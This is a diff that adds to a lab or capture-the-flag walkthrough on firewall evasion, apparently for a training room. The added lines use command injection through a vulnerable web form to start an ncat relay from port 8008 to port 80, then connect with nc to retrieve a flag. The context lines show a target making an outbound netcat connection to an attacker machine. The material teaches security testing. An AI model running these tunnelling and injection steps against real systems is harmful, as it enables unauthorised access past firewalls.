@@ -69,3 +69,10 @@ Lookup `00:02:DC` on https://macaddress.io/ the answer is `Fujitsu General Ltd`
 `nc -lvnp 1025` on Attacker Machine, `nc AttkIP 21` on target machine.
 
 Answer is `21`
+
+> We have a web server listening on the HTTP port, 80. The firewall is blocking traffic to port 80 from the untrusted network; however, we have discovered that traffic to TCP port 8008 is not blocked. We’re continuing to use the web-form from Task 6 to set up the ncat listener that forwards the packets received to the forwarded port. Using port tunneling, browse to the web server and retrieve the flag.
+
+1. On the vulnerable web form, execute `ncat -lvnp 8008 -c "ncat localhost 80"`
+2. On the Attack Machine, execute `nc 10.10.175.124 8008`
+3. Perform a `GET /` request from the netcat terminal on the Attack Machine to the Target to display the flag.
+
